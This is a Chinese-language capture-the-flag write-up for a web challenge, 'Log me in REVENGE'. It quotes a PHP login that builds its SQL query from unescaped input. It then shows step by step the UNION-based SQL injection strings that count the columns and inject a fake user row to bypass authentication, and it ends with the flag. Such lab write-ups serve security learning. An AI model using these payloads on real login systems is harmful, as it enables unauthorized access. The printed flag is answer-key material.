#Web 

## 題目

**Log me in REVENGE**
給了一個網址，點開來
![[W1-21_web.png|center|300]]
點 `Source Code`，跟[[Log me in]] 的一樣，不同點：
```php
$query = "SELECT * FROM users WHERE username = '$username'";
$user = $stmt->fetch(PDO::FETCH_ASSOC);
if ($user && $user['password'] ==$password) {
	echo "<h1>Login successful!</h1>";
	echo "Here is your flag: <code>{$flag}</code>";
} else {
	echo "<h1>Wrong Username or Password</h1>";
}   
```

---
## 解題
1. 觀察 source code 
   ```SQL
   SELECT * FROM users WHERE username = '$username'
   ```
   但後面的判斷要求 
   ```php
   if ($user && $user['password'] ==$password)
   ``` 
   -> 無法用簡單的 SQL injection 登入
   -> <mark style="background: #FFF3A3A6;">嘗試自行寫入一組帳號密碼</mark>
   -> 用 `UNION` 指令將兩個語句合在一起
   >[!note] UNION
   >將兩個（或多個） SELECT 查詢的結果集合併成一個結果集
   >- `UNION`：自動移除結果集中的重複資料列，只保留不重複的記錄
   >- `UNION ALL` 會保留所有查詢結果，包含重複的資料列
   
2. 想要產生一組資料需要先取得 DB 的欄位數：
   依序輸入產生資料的指令，觀察哪個出現 "Wrong Username or Password"：
   ``` SQL
   'OR 1=1 UNION SELECT 1;--'
   'OR 1=1 UNION SELECT 1, 2;--'
   'OR 1=1 UNION SELECT 1, 2, 3;--'
   ...
   ```
   -> 發現直到 `SELECT 1, 2, 3` 才沒有報 syntax error 
   -> 總共有 3 個欄位
3. 判斷欄位對應：
   `$user = $stmt->fetch(PDO::FETCH_ASSOC);` 拿「查詢結果的第一筆」，為了避免 DB 裡面已經有這筆資料 -> 先故意讓原本查詢沒有結果 
   --> `OR 1=1` 改 `AND 1=0`
   `Username` 欄位輸入：
   ```SQL
   'AND 1=0 UNION SELECT 'AA', 'BB', 'CC';--'
   ```
   使查詢為
   ```SQL
   SELECT * FROM users WHERE username = ''AND 1=0 UNION SELECT 'AA', 'BB', 'CC';--''
   ```
   >人工產生一筆有 3 欄的資料，欄位內容分別為 `AA`、`BB`、`CC`
   
   `Password` 依次輸入`AA`、`BB`、`CC`，通過則代表那一欄是密碼（`$user['password']`）
   -> 輸入 `CC` 後通過 -> `CC` 所在的第三欄是密碼，並且密碼是 `CC`
1. flag = `CTF{log_me_in_rev_web_a1a6571232194e456cca0279}`













